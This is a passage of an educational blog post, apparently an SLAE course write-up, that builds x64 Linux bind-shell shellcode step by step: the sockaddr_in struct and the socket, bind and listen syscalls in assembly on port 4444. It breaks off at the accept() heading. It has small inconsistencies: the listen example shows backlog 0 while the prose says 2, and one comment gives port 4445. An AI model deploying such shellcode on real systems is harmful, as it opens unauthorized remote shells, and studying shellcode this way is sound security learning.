+  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;u_short&lt;/span&gt;         &lt;span class=&quot;nx&quot;&gt;sin_family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;     &lt;span class=&quot;cm&quot;&gt;/* always AF_INET                          */&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;u_short&lt;/span&gt;         &lt;span class=&quot;nx&quot;&gt;sin_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;cm&quot;&gt;/* the service port                        */&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in_addr&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;cm&quot;&gt;/* the IP address                          */&lt;/span&gt;
+     &lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt;            &lt;span class=&quot;nx&quot;&gt;sin_zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* unused (reserved for expansion          */&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So the way we should set up our struct should specify the 1) AF_INET address family, 2) port in network byte order for which we can use the htons() syscall, 3) INADDR_ANY (0.0.0.0) - bind a socket to all the interfaces as we want to receive all packets directed to the specified port on all IP addresses.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;INADDR_ANY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;bzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;syscalls&quot;&gt;&lt;u&gt;Syscalls&lt;/u&gt;&lt;/h3&gt;
+
+&lt;p&gt;To achieve the goal set for task 1, we have to understand how and for what we use the following syscalls: &lt;code class=&quot;highlighter-rouge&quot;&gt;socket(), bind(), accept(), listen(), accept(), dup2(), write(), read() and execve()&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h4 id=&quot;socket-syscall&quot;&gt;&lt;b&gt;socket() syscall&lt;/b&gt;&lt;/h4&gt;
+
+&lt;p&gt;We use socket() syscall in order to create a new socket for endpoint communication. Socket returns us a file descriptor, which we can use with other syscalls, for example when binding an address to the socket. &lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt; syscall takes 3 parameters: communication &lt;b&gt;domain&lt;/b&gt; AF_INET for IPv4 Internet protocols, communication &lt;b&gt;type&lt;/b&gt; SOCK_STREAM - a reliable two-way connection and a &lt;b&gt;protocol&lt;/b&gt; - specifies the protocol to be used with the socket. By socket() syscall documentation, normally only a single protocol exists to support a socket type within a protocol family, so we can specify it as 0.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In order to implement this in assembly, we can make use of python to know respective values for AF_INET and SOCKET_STREAM.&lt;/p&gt;
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;python&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Python&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rc1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Nov&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2018&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;GCC&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;7.3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;linux2&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;copyright&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;credits&quot;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;more&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;information&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SOCK_STREAM&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;b&gt;It’s time to look at the assembly now!&lt;/b&gt; &lt;a href=&quot;https://software.intel.com/en-us/articles/introduction-to-x64-assembly&quot;&gt;x64 calling convention&lt;/a&gt; states that the 1st argument should go to register RDI, 2nd to RSI and 3rd to RDX. The respective syscall value for socket() should go to RAX. Syscall values can easily be found via ausyscall command &lt;code class=&quot;highlighter-rouge&quot;&gt;ausyscall socket&lt;/code&gt; which is part of the auditd package (&lt;code class=&quot;highlighter-rouge&quot;&gt;apt get install auditd&lt;/code&gt;).&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ausyscall&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;             &lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;socketpair&lt;/span&gt;         &lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So the assembly code for &lt;code class=&quot;highlighter-rouge&quot;&gt;sockfd = socket(AF_INET, SOCK_STREAM, 0);&lt;/code&gt; should look as follows:&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;			&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;			&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SOCK_STREAM&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;                    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;protocol&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;			&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;number&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;copysocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;				&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'s save the returned fd for later use
+	mov rdi, rax
+	xor rax, rax
+
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;bind-syscall&quot;&gt;&lt;b&gt;bind() syscall&lt;/b&gt;&lt;/h4&gt;
+
+&lt;p&gt;When a socket is created, as we saw in the previous step, it has no specific address assigned to it. For that we need the &lt;code class=&quot;highlighter-rouge&quot;&gt;bind()&lt;/code&gt; syscall, which assigns the address specified by &lt;code class=&quot;highlighter-rouge&quot;&gt;addr&lt;/code&gt; for socket specified by sockfd. &lt;code class=&quot;highlighter-rouge&quot;&gt;sockfd&lt;/code&gt; here is the file descriptor we received in return from using the &lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt; syscall.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socklen_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addrlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;b&gt;Assembly&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;/b&gt;&lt;/p&gt;
+
+&lt;p&gt;We have already saved the sockfd value to RDI in previous assembly example (see copysocket) so no need to assign it again. Let’s focus on the const &lt;code class=&quot;highlighter-rouge&quot;&gt;struct sockaddr *addr&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;socklen_t addrlen&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;One thing to know about structs in C is that it is a contiguous block of memory where each member is located at a certain offset from the start of the structure. You can easily verify it loading the C code example above to gdb debugger and examining the memory. The first member of the struct is on the lowest address and last member on the highest. For us to do the same in assembly, we need to take into account byte sizes of each member.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/struct.png&quot; alt=&quot;SLAE task 1 struct&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In assembly this would look as follows: first we make a push for the 8 zero bytes (RAX is 64-bit/8-bytes). Next we fill up 4 bytes with zeros for INADDR_ANY (0.0.0.0). The port we want to be using here is 4444, which in hexadecimal format would be 115d. However we need to present it in network byte order which means arranging the bytes in the manner where the most significant byte would be on the smallest address. This would take up 2 bytes. And finally we place the first member of the struct (2 bytes in length) AF_INET, to the lowest address. When we are done, it is also important to adjust the stack pointer to point it to the top of the stack again (to the start address of our struct).&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;server_struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;                    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s_addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;INADDR_ANY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5d11&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4445&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x115d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;       &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_family&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we can focus on the &lt;code class=&quot;highlighter-rouge&quot;&gt;bind()&lt;/code&gt; syscall which takes 3 parameters. We already got RDI in place, so what we need to do next is give RSI the starting address of our struct which we know is at RSP. Third argument (RDX) represents the length of the struct which we get with this calculation: 2 bytes (AF_INET) + 2 bytes (port) + 4 bytes (INADDR_ANY) + 8 bytes (8 zero bytes) = 16 bytes. Bind() syscall is represented by syscall number 49 in decimal.&lt;/p&gt;
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;already&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;equal&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fd&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;listen-syscall&quot;&gt;&lt;b&gt;listen() syscall&lt;/b&gt;&lt;/h4&gt;
+
+&lt;p&gt;We have successfully created a socket and bind an address to it. Next what we want to be doing is listening on the socket for any incoming connections. &lt;code class=&quot;highlighter-rouge&quot;&gt;listen()&lt;/code&gt; syscall is quite simple in the sense that it only takes 2 parameters &lt;code class=&quot;highlighter-rouge&quot;&gt;int sockfd&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;int backlog&lt;/code&gt;. From the two parameters, first is the sockfd which we already have stored in RDI. The second argument defines the length to which the queue of pending connections for sockfd may grow (quoting from the man page). We simply set it to be 2.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;In order to implement it in &lt;b&gt;assembly&lt;/b&gt; we only have to zero out RSI and mov 2 to it, then make the call for listen syscall.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;already&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;set&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;accept-and-close-syscall&quot;&gt;&lt;b&gt;accept() and close() syscall&lt;/b&gt;&lt;/h4&gt;
+
